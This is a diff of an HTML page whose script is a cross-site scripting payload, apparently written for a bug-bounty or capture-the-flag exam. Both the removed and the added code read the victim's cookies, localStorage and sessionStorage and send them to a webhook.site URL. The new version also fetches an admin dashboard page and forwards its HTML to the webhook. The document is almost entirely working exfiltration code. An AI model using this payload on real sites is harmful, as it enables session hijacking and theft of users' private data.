@@ -4,23 +4,31 @@
     <script>
         const webhook = "https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283";
         
-        // 1. Prepare the loot bag
-        const loot = {
-            cookies: document.cookie || "No cookies (likely HttpOnly)",
+        // 1. Collect all possible session storage methods
+        const sessionData = {
+            cookies: document.cookie,
             localStorage: JSON.stringify(localStorage),
-            sessionStorage: JSON.stringify(sessionStorage),
-            url: window.location.href
+            sessionStorage: JSON.stringify(sessionStorage)
         };
 
-        // 2. Send the loot to your webhook as a POST request
+        // 2. Send the loot to your webhook
         fetch(webhook, {
             method: "POST",
             mode: "no-cors",
-            body: "FULL_SESSION_LOOT: " + JSON.stringify(loot)
+            body: "SESSION_STOLEN: " + JSON.stringify(sessionData)
         });
 
-        // 3. Backup: Send via GET if POST is filtered
-        fetch(webhook + "?cookie_b64=" + btoa(document.cookie));
+        // 3. Try to fetch the Admin Dashboard HTML directly 
+        // Sometimes the Flag is just hidden in the page source!
+        fetch("https://bugbounty-exam.hashacademy.co/admin/dashboard")
+            .then(r => r.text())
+            .then(html => {
+                fetch(webhook, {
+                    method: "POST",
+                    mode: "no-cors",
+                    body: "DASHBOARD_SOURCE: " + html
+                });
+            });
     </script>
 </body>
 </html>
